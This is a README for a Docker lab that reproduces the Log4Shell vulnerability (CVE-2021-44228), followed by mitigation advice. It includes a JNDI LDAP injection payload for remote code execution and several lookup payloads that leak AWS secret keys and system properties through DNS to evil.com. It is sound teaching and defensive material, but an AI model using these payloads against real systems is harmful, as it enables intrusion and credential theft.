# Log4Shell docker lab for CVE-2021-44228

## The components
This docker lab makes use of three components, being:
- The vulnerable spring-boot application
- An HTTP server that hosts **.class** files used for remote code execution
- An LDAP referral server which redirects specific LDAP queries to the HTTP server

## Docker lab setup
### 1. Docker network
```bash
docker network create log4shell
```

### 2. Building the Docker images
```bash
$ docker build -t log4shell-vulnapp vulnapp
$ docker build -t log4shell-httpserver httpserver
$ docker build -t log4shell-marshalsec marshalsec
```

### 3. Running the containers
**Important note:** If you are using Windows PowerShell, replace `$(pwd)` with `${pwd}`.

```bash
$ docker run -d --name log4shell-vulnapp --network="log4shell" -p 8080:8080 log4shell-vulnapp
$ docker run -d --name log4shell-httpserver --network="log4shell" -p 3223:3223 -v $(pwd)/httpserver:/httpserver log4shell-httpserver
$ docker run -d --name log4shell-marshalsec --network="log4shell" -p 1389:1389 log4shell-marshalsec "http://<HostIp>:<Port>/#<RCEObjectName>"
```

## Exploit
Open up the vulnerable application, input some false test credentials, and open up the
logs of the **log4shell-vulnapp** container.
It can be seen that the application is logging unsuccessful login attempts (e.g., *Incorrect login attempt for username 'test'*). From this small experiment, it is established that we have control over some part of the logged string (i.e., the username).

We can pass a payload like the following to remotely execute code:
```bash
${jndi:ldap://<HostIp>:1389/<RCEObjectName>}
```
Remote code execution can be done in any java version; however, machines with java versions older than the following list [[1]](#1):
- 6u211
- 7u201
- 8u191
- 11.0.1

This is due to the fact that later versions set the JVM system property `com.sun.jndi.ldap.object.trustURLCodebase` to `false` by default, which disables JNDI loading of classes from arbitrary URL code bases. **However, relying only on a new Java version as protection against this vulnerability is risky**, as the vulnerability may still be exploited on machines that contain certain "gadget" classes in the classpath of the vulnerable application and DNS queries can be used to obtain information such as environment variables.

There are several lookup substitutions that reveal sensitive information from the victim machine. Most prominently, using a payload similar to [[2](#2), [3](#3)]:
```bash
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.evil.com/foo}
${jndi:ldap://${sys:user.name}.evil.com/foo}
${jndi:ldap://${main:x}.evil.com/foo}
${jndi:ldap://${spring:supersecretkey}.evil.com/foo}
```
**Note:** The spring lookup attack string requires **log4j-spring-cloud-config-client** be included in the application. [[2]](#2)

## Mitigation
The best way to mitigate this serious vulnerability is to upgrade log4j2 to a version **>= 2.17.0**. However, it is possible to completely mitigate the issue without upgrading using two different methods. It is strongly recommended to vendors that cannot upgrade to a newer Log4j2 version **to use both mitigation methods** specified below [[1]](#1).

### Method 1: For log4j 2.10.0 or later - Disable lookups
Disabling lookups can be done (globally) by setting the environment variable **LOG4J_FORMAT_MSG_NO_LOOKUPS** to true by editing the **/etc/environment** file and adding: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` [[1]](#1)

Alternatively, lookups can be disabled for a specific invocation of the JVM by adding the following command-line flag when running the vulnerable Java application: `‐Dlog4j2.formatMsgNoLookups=True` [[1]](#1)

### Method 2: For log4j older than 2.10.0 - Removing the vulnerable class
When using a log4j version older than 2.10.0, it is possible to remove the **JndiLookup** class from any Java applications.

## References
<a id="1">[1]</a> Menashe, S., (2021). All About Log4Shell 0-Day Vulnerability - CVE-2021-44228. [online] JFrog. Available at: <https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know> [Accessed 24 December 2021].

<a id="2">[2]</a> Goers, R., (2021). Log4j – Log4j 2 Lookups. [online] logging.apache.org. Available at: <https://logging.apache.org/log4j/2.x/manual/lookups.html> [Accessed 24 December 2021].

<a id="3">[3]</a> Oracle. (2021). System Properties. [online] Available at: <https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html> [Accessed 24 December 2021].
